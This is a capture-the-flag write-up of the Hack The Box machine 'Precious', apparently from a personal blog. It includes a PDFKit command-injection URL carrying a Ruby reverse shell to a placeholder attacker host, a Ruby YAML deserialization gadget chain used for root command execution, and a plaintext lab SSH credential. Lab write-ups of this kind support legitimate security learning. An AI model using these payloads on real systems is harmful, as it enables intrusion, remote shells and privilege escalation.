---
title: Hack The Box - Precious - Easy Machine
published: true
---

# [](#Introduction)Introduction

**Precious** is an easy-level Linux machine on Hack The Box. It has been more than 50 days since its release, it's not the most recent machine but it's an interesting one in my opinion.

My work environment for hacking this machine:
- Ubuntu 20.04 LTS with some hacking tools installed
- An [Exegol](https://github.com/ThePorgs/Exegol) instance

## [](#User-Flag)User flag

### Nmap scan

![](/assets/precious/precious_nmap.png)

I can identify two open ports: the http port (80) and the ssh port (22). If I look at the website hosted on precious.htb, I see the following content:

![](/assets/precious/website.png)

It seems to be a website which converts web pages to PDF format. Moreover, by checking the HTTP response header, I've obtained an idea of the used technologies: **Ruby** as programming language and **Nginx** + **Phusion Passenger** as server infrastructure.

![](/assets/precious/http_headers.png)

So, after directory enumeration with Dirbuster and a scan with Nikto without success, I've looked for PDF conversion of web pages in Ruby, and I've found this article: [Link](https://dev.to/ayushn21/converting-html-to-pdf-using-rails-54e7)

According to this article, there are two options with Ruby on Rails to convert web pages to PDF:
- PDFKit
- WickedPDF 

```
A couple of popular gems to convert HTML to PDF in Rails are PDFKit and WickedPDF. 
They both use a command line utility called wkhtmltopdf under the hood; which uses WebKit to render a PDF from HTML. 
```

After a brief search, I've identified the disponibility of an exploit for command injection in PDFKit (CVE-2022-25765), with this [link](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795).

```ruby
PDFKit.new("http://example.com/?name=#{params[:name]}").to_pdf 
```
I can inject a reverse shell with the following payload in the ***url*** :
```
http://precious.htb/?url=#{'%20`ruby -rsocket -e'exit if fork;c=TCPSocket.new("YOUR_IP","YOUR_PORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`'} 
```

And... SUCCESS!!
I have the reverse shell and it was pretty easy!

![](/assets/precious/reverse_shell.png)


In the config files we have nothing interesting:

![](/assets/precious/web_folder.png)

Let's take a look to /home directory for user flag:

![](/assets/precious/ssh_creds_henry.png)

The user.txt file is in **/home/henry** but I'm logged as **ruby**, so I don't have the permission to read user.txt file. However, there is an interesting thing in **/home/ruby/.bundle/config** file, it seems to be Henry's ssh credentials.

**henry**:**Q3c1AqGHtoI0aXAYFH**


And yes, actually, it's Henry's ssh credentials! I can read the user flag now:

![](/assets/precious/user_flag.png)

***

## [](#Root-Flag) Root flag

Let's check the privesc vectors in order to get the root flag in **/root/root.txt**.

![](/assets/precious/sudo_l.png)

With **sudo -l** I can affirm that Henry can execute the **update_dependencies.rb** file as super user with the following command **sudo /usr/bin/ruby /opt/update_dependencies.rb**, and after checking this file, I've found an injection point.

***update_dependencies.rb***
```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end

```

***Injection point***
```ruby
YAML.load(File.read("dependencies.ml"))
```


But what can I write into dependencies.ml for being able to read the root flag? 

After some searchs, I've found that YAML.load() function is vulnerable to code injection due to inescrure deserialization, and that there is a payload to exploit this vulnerability in the famous **PayloadAllTheThings** GitHub repo ([Link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)).


For being able to execute commands as root, I've written this piece of yaml code in a file named dependencies.ml:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cat /root/root.txt
         method_id: :resolve
```
The ***git_set*** parameter is the command that we want to execute, and thanks to this payload we can finally get the root flag!

![](/assets/precious/root_flag.png)